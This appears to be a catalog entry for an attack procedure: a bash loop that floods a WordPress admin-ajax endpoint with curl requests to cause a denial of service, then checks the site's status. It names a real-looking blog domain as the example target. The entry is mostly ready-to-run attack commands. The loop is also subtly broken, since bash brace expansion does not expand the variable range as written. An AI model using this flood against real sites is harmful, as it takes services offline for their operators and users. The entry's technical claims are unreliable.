---
data: >-
  for i in {1..$COUNT}; do curl -s
  "$TARGET/wp-admin/admin-ajax.php?action=upload-errors" > /dev/null; done

  curl -I $TARGET | head -1
tags:
  - dos
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.034Z'
id: f163f773-42b4-47a2-9b83-36b013ff117f
verified: false
validated: true
submitted: true
---
# curl-swfupload-dos

## Command

```bash
for i in {1..$COUNT}; do curl -s "$TARGET/wp-admin/admin-ajax.php?action=upload-errors" > /dev/null; done
curl -I $TARGET | head -1
```

## Description

Floods the WordPress SWFUpload endpoint with requests to cause DoS, then verifies site status.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$TARGET` | Target URL (e.g., https://blog.makerdao.com) | Yes |
| `$COUNT` | Number of requests (e.g., 1000) | Yes |
| `-s` | Silent mode | No |
| `> /dev/null` | Suppress output | No |

## Examples

### Basic Usage

```bash
TARGET=https://blog.makerdao.com
COUNT=1000
for i in {1..$COUNT}; do curl -s "$TARGET/wp-admin/admin-ajax.php?action=upload-errors" > /dev/null; done
```

### Advanced Usage

```bash
TARGET=https://blog.makerdao.com
curl -I $TARGET | head -1
```

## Expected Output

Loop completes silently; verification shows HTTP errors or timeouts post-flood.

## Related

- [[Related Procedure]]
